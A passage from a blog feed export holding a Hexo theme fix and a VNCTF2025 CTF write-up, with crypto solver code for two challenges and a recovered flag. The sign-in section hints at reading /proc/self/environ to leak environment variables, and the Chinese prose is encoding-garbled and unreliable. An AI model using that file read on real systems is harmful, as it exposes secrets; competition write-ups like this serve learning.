class="hljs-keyword">if</span> (each.avatar || each.image) &#123; %&gt;<br>                      &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;link-avatar my-auto&quot;</span>&gt;<br>                        &lt;img src=<span class="hljs-string">&quot;&lt;%= url_for(each.avatar || each.image) %&gt;&quot;</span> alt=<span class="hljs-string">&quot;&lt;%= each.title %&gt;&quot;</span><br>                          onerror=<span class="hljs-string">&quot;this.onerror=null; this.src=&#x27;&lt;%= url_for(theme.links.onerror_avatar) %&gt;&#x27;&quot;</span> /&gt;<br>                      &lt;/div&gt;<br>                      &lt;% &#125; %&gt;<br>                        &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;link-text&quot;</span>&gt;<br>                          &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;link-title&quot;</span>&gt;&lt;%- each.title %&gt;&lt;/div&gt;<br>                          &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;link-intro&quot;</span>&gt;&lt;%- each.intro || <span class="hljs-string">&#x27;&#x27;</span> %&gt;&lt;/div&gt;<br>                        &lt;/div&gt;<br>                  &lt;/div&gt;<br>                &lt;/a&gt;<br>              &lt;/div&gt;<br>              &lt;% &#125; %&gt;<br>        &lt;/div&gt;<br>        &lt;% &#125; %&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><p>é‡åˆ°é—®é¢˜ï¼šé‡æ–°éƒ¨ç½²åšå®¢çš„æ—¶å€™è¯´linksä¸­çš„pageæœªå®šä¹‰ï¼Œä½†æˆ‘æ˜æ˜ä»€ä¹ˆéƒ½æ²¡åŠ¨</p><p>æœ€åç»™æœ€ä¸Šé¢æ¯ä¸€è¡ŒåŠ ä¸ªåˆ†å·å°±ä¸æŠ¥é”™äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;%<br>page.layout = <span class="hljs-string">&quot;links&quot;</span>;<br>page.title = theme.links.title || __(<span class="hljs-string">&#x27;links.title&#x27;</span>);<br>page.subtitle = theme.links.subtitle || __(<span class="hljs-string">&#x27;links.subtitle&#x27;</span>);<br>page.banner_img = theme.links.banner_img;<br>page.banner_img_height = theme.links.banner_img_height;<br>page.banner_mask_alpha = theme.links.banner_mask_alpha;<br>page.comment = theme.links.comments.<span class="hljs-built_in">type</span>;<br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>fliud</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>fliud</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2025</title>
    <link href="/2025/02/09/vnctf2025/"/>
    <url>/2025/02/09/vnctf2025/</url>
    
    <content type="html"><![CDATA[<h1 id="ç­¾åˆ°"><a class="markdownIt-Anchor" href="#ç­¾åˆ°"></a> ç­¾åˆ°</h1><h2 id="æ¬¢è¿"><a class="markdownIt-Anchor" href="#æ¬¢è¿"></a> æ¬¢è¿</h2><p>/proc/self/environè¯»å–ç¯å¢ƒå˜é‡</p><p>sedåŒ¹é…åä½¿ç”¨<code>&amp;</code>ç¬¦å·å¯ä»¥å†æ¬¡å¼•ç”¨åŒ¹é…åˆ°çš„å­—ç¬¦</p><p><img src="/imgs/vnctf2025/1.png" alt="1" /></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="easymath"><a class="markdownIt-Anchor" href="#easymath"></a> easymath</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>flag=bytes_to_long(flag)<br>l=flag.bit_length()//<span class="hljs-number">3</span> + <span class="hljs-number">1</span><br>n=[]<br>N=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(n) &lt; <span class="hljs-number">3</span>:<br>    p = <span class="hljs-number">4</span>*getPrime(l)-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> isPrime(p):<br>        n.append(p)<br>        N *= p<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c=<span class="hljs-subst">&#123;flag*flag%N&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols, expand<br>x = symbols(<span class="hljs-string">&#x27;x&#x27;</span>)<br>polynomial = expand((x - n[<span class="hljs-number">0</span>]) * (x - n[<span class="hljs-number">1</span>]) * (x - n[<span class="hljs-number">2</span>]))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;polynomial=&#125;</span>&#x27;</span>)<br><span class="hljs-comment"># c=24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span><br><span class="hljs-comment"># polynomial=x**3 - 15264966144147258587171776703005926730518438603688487721465*x**2 + 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923*x - 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span><br><br></code></pre></td></tr></table></figure><p>è§£æ–¹ç¨‹+AMMå¼€æ ¹+CRT</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols, Eq, solve<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> math<br>a=<span class="hljs-number">15264966144147258587171776703005926730518438603688487721465</span><br>b=<span class="hljs-number">76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span><br>c=<span class="hljs-number">125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span><br><br>p, q, r= symbols(<span class="hljs-string">&#x27;p q r&#x27;</span>)<br>equation1 = Eq(p+q+r, a)<br>equation2 = Eq(p*q+p*r+q*r, b)<br>equation3 = Eq(p*q*r,c)<br>solutions = solve((equation1, equation2,equation3), (p, q,r))<br>p,q,r=solutions[<span class="hljs-number">0</span>]<br>p,q,r=<span class="hljs-built_in">int</span>(p),<span class="hljs-built_in">int</span>(q),<span class="hljs-built_in">int</span>(r)<br><br>c=<span class="hljs-number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span><br>n=p*q*r<br>e=<span class="hljs-number">2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">onemod</span>(<span class="hljs-params">e, q</span>):<br>    p = random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span>(powmod(p, (q-<span class="hljs-number">1</span>)//e, q) == <span class="hljs-number">1</span>):  <span class="hljs-comment"># (r,s)=1</span><br>        p = random.randint(<span class="hljs-number">1</span>, q)<br>    <span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AMM_rth</span>(<span class="hljs-params">o, r, q</span>):  <span class="hljs-comment"># r|(q-1</span><br>    <span class="hljs-keyword">assert</span>((q-<span class="hljs-number">1</span>) % r == <span class="hljs-number">0</span>)<br>    p = onemod(r, q)<br><br>    t = <span class="hljs-number">0</span><br>    s = q-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(s % r == <span class="hljs-number">0</span>):<br>        s = s//r<br>        t += <span class="hljs-number">1</span><br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>((s*k+<span class="hljs-number">1</span>) % r != <span class="hljs-number">0</span>):<br>        k += <span class="hljs-number">1</span><br>    alp = (s*k+<span class="hljs-number">1</span>)//r<br><br>    a = powmod(p, r**(t-<span class="hljs-number">1</span>)*s, q)<br>    b = powmod(o, r*a-<span class="hljs-number">1</span>, q)<br>    c = powmod(p, s, q)<br>    h = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t-<span class="hljs-number">1</span>):<br>        d = powmod(<span class="hljs-built_in">int</span>(b), r**(t-<span class="hljs-number">1</span>-i), q)<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-number">1</span>:<br>            j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            j = (-math.log(d, a)) % r<br>        b = (b*(c**(r*j))) % q<br>        h = (h*c**j) % q<br>        c = (c*r) % q<br>    result = (powmod(o, alp, q)*h)<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_Solution</span>(<span class="hljs-params">m, q, rt, cq, e</span>):<br>    mp = []<br>    <span class="hljs-keyword">for</span> pr <span class="hljs-keyword">in</span> rt:<br>        r = (pr*m) % q<br>        <span class="hljs-comment"># assert(pow(r, e, q) == cq)</span><br>        mp.append(r)<br>    <span class="hljs-keyword">return</span> mp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_ROOT2</span>(<span class="hljs-params">r, q</span>):  <span class="hljs-comment"># use function set() and .add() ensure that the generated elements are not repeated</span><br>    li = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">len</span>(li) &lt; r):<br>        p = powmod(random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>), (q-<span class="hljs-number">1</span>)//r, q)<br>        li.add(p)<br>    <span class="hljs-keyword">return</span> li<br><br>cp = c % p<br>cq = c % q<br>cr = c % r<br><br>mp = AMM_rth(cp, e, p)<br>mq = AMM_rth(cq, e, q)<br>mr = AMM_rth(cr, e, r)<br><br>rt1 = ALL_ROOT2(e, p)<br>rt2 = ALL_ROOT2(e, q)<br>rt3 = ALL_ROOT2(e, r)<br><br>amp = ALL_Solution(mp, p, rt1, cp, e)<br>amq = ALL_Solution(mq, q, rt2, cq, e)<br>amr = ALL_Solution(mr, r, rt3, cr, e)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> amp:<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> amq:<br>        <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> amr:<br>            <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(CRT([x,y,z],[p,q,r]))))<br><span class="hljs-comment">#VNCTF&#123;90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ss0hurt"><a class="markdownIt-Anchor" href="#ss0hurt"></a> ss0Hurt!</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DaMie</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, flag , n = <span class="hljs-literal">None</span></span>):<br>        <span class="hljs-variable language_">self</span>.m = ZZ(bytes_to_long(flag))<br>        <span class="hljs-variable language_">self</span>.n = n <span class="hljs-keyword">if</span> n <span class="hljs-keyword">else</span> getPrime(<span class="hljs-number">1024</span>)<br>        <span class="hljs-variable language_">self</span>.P = Zmod(<span class="hljs-variable language_">self</span>.n)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;self.n&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">self, x, y, z</span>):<br><br>        <span class="hljs-keyword">return</span> vector([<span class="hljs-number">5</span> * x + y - <span class="hljs-number">5</span> * z, <span class="hljs-number">5</span> * y - z, <span class="hljs-number">5</span> * z])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Mat</span>(<span class="hljs-params">self, m</span>):<br>        PR = <span class="hljs-variable language_">self</span>.P[<span class="hljs-string">&#x27;x,y,z&#x27;</span>]<br>        x,y,z = PR.gens()<br><br>        <span class="hljs-keyword">if</span> m != <span class="hljs-number">0</span>:<br>            plana = <span class="hljs-variable language_">self</span>.Mat(m//<span class="hljs-number">2</span>)<br>            planb = plana(*plana)<br>            <span class="hljs-keyword">if</span> m % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">return</span> planb<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.process(*planb)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.process(*PR.gens())<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hash</span>(<span class="hljs-params">self, A, B, C</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.Mat(<span class="hljs-variable language_">self</span>.m)(A, B, C)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <br>    Ouch = DaMie(flag)<br>    result = Ouch.<span class="hljs-built_in">hash</span>(<span class="hljs-number">2025</span>,<span class="hljs-number">208</span>,<span class="hljs-number">209</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;hash(A,B,C) = <span class="hljs-subst">&#123;result&#125;</span>&#x27;</span>)<br><br></code></pre></td></tr></table></figure><blockquote><p>å‚è€ƒ<code>[2024-XYCTF-wp-crypto | ç³–é†‹å°é¸¡å—çš„blog](https://tangcuxiaojikuai.xyz/post/146254b2.html)</code></p></blockquote><p>æœ¬é¢˜åŠ å¯†æ˜¯è¿›è¡Œä¸€ä¸ªçŸ©é˜µçš„å¿«é€Ÿå¹‚ï¼Œflagåœ¨æŒ‡æ•°éƒ¨åˆ†ï¼Œæ‰€ä»¥æ˜¯ä¸€ä¸ªçŸ©é˜µä¸Šçš„DLP</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>âˆ’</mo><mn>5</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>âˆ’</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi></mrow></msup><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo separator="true">,</mo><mi>C</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\left(\begin{matrix}5&amp;1&amp;-5\\0&amp;5&amp;-1\\0&amp;0&amp;5\\\end{matrix}\right)^{flag}*(a,b,c)=(A,B,C)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.839048em;vertical-align:-1.55002em;"></span><span class="minner"><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width='0.875em' height='0.3em' style='width:0.875em' viewBox='0 0 875 300' preserveAspectRatio='xMinYMin'><path d='M291 0 H417 V300 H291 z'/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â›</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">âˆ’</span><span class="mord">5</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">âˆ’</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â </span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width='0.875em' height='0.3em' style='width:0.875em' viewBox='0 0 875 300' preserveAspectRatio='xMinYMin'><path d='M457 0 H583 V300 H457 z'/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>â</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:2.289028em;"><span style="top:-4.5029200000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span></span></span></span></span></p><p>ä½¿ç”¨jordan form:<code>æœ¬è´¨æ˜¯è§£ä¸€ä¸ªæ¨¡pä¸‹çš„çº¿æ€§æ–¹ç¨‹ç»„</code></p><blockquote><p>å¦‚æœä½¿ç”¨è¡Œåˆ—å¼æ–¹æ³•ï¼Œp-1å¹¶ä¸å…‰æ»‘ï¼›å¦‚æœä½¿ç”¨ä¸€èˆ¬çº¿æ€§ç¾¤çš„é˜¶ï¼Œä»–æ‰€æœ‰çš„å­ç¾¤é˜¶ä¹Ÿéƒ½ä¸å…‰æ»‘</p></blockquote><p>jordan formåŸç†ï¼š</p><p>ä»»ä½•ä¸€ä¸ªéå¥‡å¼‚çŸ©é˜µLéƒ½å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼å˜æ¢æˆjordan formï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mi>P</mi><mo>âˆ—</mo><mi>J</mi><mo>âˆ—</mo><msup><mi>P</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><msup><mi>P</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>âˆ—</mo><mi>L</mi><mo>âˆ—</mo><mi>P</mi><msup><mo stretchy="false">)</mo><mi>n</mi></msup><mo>=</mo><msup><mi>J</mi><mi>n</mi></msup><mspace linebreak="newline"></mspace><msup><mi>P</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>âˆ—</mo><mi>L</mi><mi>n</mi><mo>âˆ—</mo><mi>P</mi><mo>=</mo><msup><mi>J</mi><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">L=P*J*P^{-1}\\(P^{-1}*L*P)^n=J^n\\P^{-1}*Ln*P=J^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" 